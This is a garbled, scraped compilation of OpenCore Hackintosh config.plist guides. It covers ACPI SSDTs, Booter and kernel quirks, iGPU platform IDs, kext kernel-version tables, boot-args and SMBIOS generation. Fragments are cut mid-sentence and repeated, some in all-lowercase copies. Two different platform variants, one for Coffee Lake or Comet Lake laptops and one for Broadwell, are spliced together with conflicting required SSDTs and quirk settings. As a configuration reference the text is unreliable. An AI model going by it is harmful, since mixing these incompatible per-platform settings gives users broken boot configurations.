kernelarch: x86_64\n   \n   * set the kernel's arch type, you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we recommend auto for

It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX     Fixes both the embedded controller and USB power, see\n                 Getting Started With ACPI Guide for more details.\nSSDT-GPIO        Creates a stub so VoodooI2C can connect, for those having\n                 troubles getting VoodooI2C working can try SSDT-XOSI\n                 instead. Note that Intel NUCs do not need this\nSSDT-PNLF        Fixes brightness control, see Getting Started With ACPI\n                 Guide for more details. Note that Intel NUCs do not need\n                 this\nSSDT-AWAC        This is the 300 series RTC patch, required for most B360,\n                 B365, H310, H370, Z390 and some Z370 boards which prevent\n                 systems from booting macOS. The alternative is SSDT-RTC0 for\n                 when AWAC SSDT is incompatible due to missing the Legacy RTC\n                 clock, to check whether you need it and which to use please\n                 see Getting started with ACPI page.\nSSDT-PMC         So true 300 series motherboards(non-Z370) don't declare the\n                 FW chip as MMIO in ACPI and so XNU ignores the MMIO region\n                 declared by the UEFI memory map. This SSDT brings back NVRAM\n                 support. Note that 10th gen CPUs do not need this. See\n                 Getting Started With ACPI Guide for more details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nInfo\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, we'll need the following:\n\n * OSI rename\n   * This is required when using SSDT-XOSI as we redirect all OSI calls to this SSDT, this is not needed if you're using SSDT-GPIO\n\nCOMMENT   STRING    CHANGE _OSI TO XOSI\nEnabled   Boolean   YES\nCount     Number    0\nLimit     Number    0\nFind      Data      5f4f5349\nReplace   Data      584f5349\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing devices to be pass-through to macOS that are generally ignored, for us we can ignore this section.\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we need to change the following:\n\nQUIRK                    ENABLED   COMMENT\nDevirtualiseMmio         YES\nEnableWriteUnprotector   NO\nProtectMemoryRegions     YES\nProtectUefiServices      YES\nRebuildAppleMemoryMap    YES\nSyncRuntimePermissions   YES\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * DevirtualiseMmio: YES\n   * Reduces Stolen Memory Footprint, expands options for slide=N values and very helpful with fixing Memory Allocation issues on Z390. Requires ProtectUefiServices as well on IceLake and Z390 Coffee Lake\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: NO\n   * This quirk and RebuildAppleMemoryMap can commonly conflict, recommended to enable the latter on newer platforms and disable this entry.\n   * However, due to issues with OEMs not using the latest EDKII builds you may find that the above combo will result in early boot failures. This is due to missing the MEMORY_ATTRIBUTE_TABLE and such we recommend disabling RebuildAppleMemoryMap and enabling EnableWriteUnprotector. More info on this is covered in the troubleshooting section\n * ProtectMemoryRegions: YES\n   * Patches memory region types for incorrectly mapped CSM/MMIO regions. Necessary for all Chromebooks that utilize coreboot UEFI firmware.\n * ProtectUefiServices: YES\n   * Protects UEFI services from being overridden by the firmware, mainly relevant for VMs, Icelake and Z390 systems'\n   * If on Z390, enable this quirk\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * RebuildAppleMemoryMap: YES\n   * Generates Memory Map compatible with macOS, can break on some laptop OEM firmwares so if you receive early boot failures disable this\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, shouldn't be needed on Skylake and newer. Some firmware like Gigabyte may still require it, and will kernel panic without this\n * SyncRuntimePermissions: YES\n   * Fixes alignment with MAT tables and required to boot Windows and Linux with MAT tables, also recommended for macOS. Mainly relevant for RebuildAppleMemoryMap users\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nWhen setting up your iGPU, the table below should help with finding the right values to set. Here is an explanation of some values:\n\n * AAPL,ig-platform-id\n   * This is used internally for setting up the iGPU\n * Type\n   * Whether the entry is recommended for laptops(ie. with built-in displays) or for Intel NUCs(ie. stand alone boxes)\n\nGenerally follow these steps when setting up your iGPU properties. Follow the configuration notes below the table if they say anything different:\n\n 1. When initially setting up your config.plist, only set AAPL,ig-platform-id - this is normally enough\n 2. If you boot and you get no graphics acceleration (7MB VRAM and solid background for dock), then you likely need to try different AAPL,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\nAAPL,IG-PLATFORM-ID   TYPE     COMMENT\n0900A53E              Laptop   Recommended value for UHD 630\n00009B3E              Laptop   Recommended value for UHD 620\n07009B3E              NUC      Recommended value for UHD 620/630\n0000A53E              NUC      Recommended value for UHD 655\n\n# Configuration Notes\n\n * For UHD 630 you likely do not need to fake the device-id as it is already 0x3E9B. If it's anything else, you may use device-id=9B3E0000:\n   * You can check under Device Manager in Windows by bring up the iGPU, opening properties, selecting details, and clicking Hardware IDs.\n\nKEY         TYPE   VALUE\ndevice-id   Data   9B3E0000\n\n * A UHD 620 in a Comet Lake CPU requires device-id=9B3E0000:\n\nKEY         TYPE   VALUE\ndevice-id   Data   9B3E0000\n\n * In some cases where you cannot set the DVMT-prealloc of these cards to 64MB higher in your UEFI Setup, you may get a kernel panic. Usually they're configured for 32MB of DVMT-prealloc, in that case these values are added to your iGPU Properties\n\nKEY                        TYPE   VALUE\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\nframebuffer-fbmem          Data   00009000\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot argument alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present. More info on this is covered in the Post-Install Page\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nNeeded for spoofing unsupported CPUs like Pentiums and Celerons. For those with Coffee Lake Plus you can skip this section, but for those with Comet Lake CPUs see below\n\nComet Lake info\n\nComet Lake U62 CPUs require a spoof to Comet Lake U42 as macOS does not support these CPUs. You can check Device Manager in Windows to see if you have a Comet Lake U62 CPU:\n\n 1. Go to the \"Processors\" section\n 2. Double click on one of the CPUs\n 3. Click on the \"Details\" tab\n 4. Click on the \"Hardware ID\" field\n 5. If it says ACPI\\GenuineIntel_-_Intel64_Family_6_Model_166, you need to spoof:\n\n * Cpuid1Data: EC060800000000000000000000000000\n * Cpuid1Mask: FFFFFFFF000000000000000000000000\n\nOn Linux, you can use lscpu | grep \"Model:\". If the model is 166, you need to spoof.\n\nAnother way to check is with the OpenCore debug log:\n\n> 00:023 00:005 OCCPU: Found Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz\n> \n> 00:028 00:005 OCCPU: Signature A0660 Stepping 0 Model A6 Family 6 Type 0 ExtModel A ExtFamily 0 uCode C6\n\nIf the model is A6, you need to spoof.\n\n\n# Force\n\nUsed for loading kexts off system volume, only relevant for older operating systems where certain kexts are not present in the cache(ie.

Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning. It is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system.

It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.\n\n * LegacySchema\n   \n   * Used for assigning NVRAM variables, used with OpenVariableRuntimeDxe.efi.

The breakdown is as follows(note that the below SMBIOS require macOS 10.15, Catalina):\n\nSMBIOS           CPU TYPE             GPU TYPE                           DISPLAY SIZE   TOUCH ID\nMacBookPro16,1   Hexa/Octa Core 45W   iGPU: UHD 630 + dGPU: 5300/5500M   15\"            Yes\nMacBookPro16,3   Quad Core 15W        iGPU: Iris 645                     13\"            Yes\nMacBookPro16,4   Hexa/Octa Core 45W   iGPU: UHD 630 + dGPU: 5600M        15\"            Yes\nMacmini8,1       NUC Systems          HD 6000/Iris Pro 6200              N/A            No\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #               MacBookPro16,1 SMBIOS Info            #\n#######################################################\n\nType:         MacBookPro16,1\nSerial:       C02XG0FDH7JY\nBoard Serial: C02839303QXH69FJA\nSmUUID:       DBB364D6-44B2-4A02-B922-AB4396F16DA8\n\n\n * Note: MacSerial currently does not support Linux, so you must grab a Windows or macOS machine to generate the MacBookPro16,2+ values\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired. See AppleSmBios.h for possible values\n\n * SpoofVendor: YES\n   \n   * Swaps vendor field for Acidanthera, generally not safe to use Apple as a vendor in most case\n\n * SystemMemoryStatus: Auto\n   \n   * Sets whether memory is soldered or not in SMBIOS info, purely cosmetic and so we recommend Auto\n\n * UpdateDataHub: YES\n   \n   * Update Data Hub fields\n\n * UpdateNVRAM: YES\n   \n   * Update NVRAM fields\n\n * UpdateSMBIOS: YES\n   \n   * Updates SMBIOS fields\n\n * UpdateSMBIOSMode: Create\n   \n   * Replace the tables with newly allocated EfiReservedMemoryType, use Custom on Dell laptops requiring CustomSMBIOSGuid quirk\n   * Setting to Custom with CustomSMBIOSGuid quirk enabled can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlus.efi\n * OpenRuntime.efi\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt

setting important igpu properties.\n\nthe config.plist doesn't already have a section for this so you will have to create it manually.\n\nwhen setting up your igpu, the table below should help with finding the right values to set. here is an explanation of some values:\n\n * aapl,ig-platform-id\n   * this is used internally for setting up the igpu\n * type\n   * whether the entry is recommended for laptops(ie. with built-in displays) or for intel nucs(ie. stand alone boxes)\n\ngenerally follow these steps when setting up your igpu properties. follow the configuration notes below the table if they say anything different:\n\n 1. when initially setting up your config.plist, only set aapl,ig-platform-id - this is normally enough\n 2. if you boot and you get no graphics acceleration (7mb vram and solid background for dock), then you likely need to try different aapl,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\naapl,ig-platform-id   type

between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer —

macbookpro16,1 smbios - this is done intentionally for compatibility's sake. the breakdown is as follows(note that the below smbios require macos 10.15, catalina):\n\nsmbios           cpu type             gpu type                           display size   touch id\nmacbookpro16,1   hexa/octa core 45w   igpu: uhd 630 + dgpu: 5300/5500m   15\"            yes\nmacbookpro16,3   quad core 15w

It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\nSSDT-GPIO        Creates a stub so VoodooI2C can connect, for those having\n                 troubles getting VoodooI2C working can try SSDT-XOSI\n                 instead. Note that Intel NUCs do not need this\nSSDT-PNLF        Fixes brightness control, see Getting Started With ACPI\n                 Guide for more details. Note that Intel NUCs do not need\n                 this\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nInfo\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, we'll need the following:\n\n * OSI rename\n   * This is required when using SSDT-XOSI as we redirect all OSI calls to this SSDT, this is not needed if you're using SSDT-GPIO\n\nCOMMENT   STRING    CHANGE _OSI TO XOSI\nEnabled   Boolean   YES\nCount     Number    0\nLimit     Number    0\nFind      Data      5f4f5349\nReplace   Data      584f5349\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be pass-through to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nWhen setting up your iGPU, the table below should help with finding the right values to set. Here is an explanation of some values:\n\n * AAPL,ig-platform-id\n   * This is used internally for setting up the iGPU\n * Type\n   * Whether the entry is recommended for laptops(ie. with built-in displays) or for Intel NUCs(ie. stand alone boxes)\n\nGenerally follow these steps when setting up your iGPU properties. Follow the configuration notes below the table if they say anything different:\n\n 1. When initially setting up your config.plist, only set AAPL,ig-platform-id - this is normally enough\n 2. If you boot and you get no graphics acceleration (7MB VRAM and solid background for dock), then you likely need to try different AAPL,ig-platform-id values, add stolenmem patches, or even add a device-id property.\n\nAAPL,IG-PLATFORM-ID   TYPE     COMMENT\n06002616              Laptop   Recommended value for Broadwell laptops\n02001616              NUC      Recommended value for Broadwell NUCs\n\n# Configuration Notes\n\n * For HD 5600 you need device-id faked to 26160000:\n\nKEY         TYPE   VALUE\ndevice-id   data   26160000\n\n * In some cases where you cannot set the DVMT-prealloc of these cards to 96MB higher in your UEFI Setup, you may get a kernel panic. Usually they're configured for 32MB of DVMT-prealloc, in that case these values are added to your iGPU Properties\n\nKEY                        TYPE   VALUE\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\nframebuffer-fbmem          Data   00009000\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot argument alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present. More info on this is covered in the Post-Install Page\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nNeeded for spoofing unsupported CPUs like 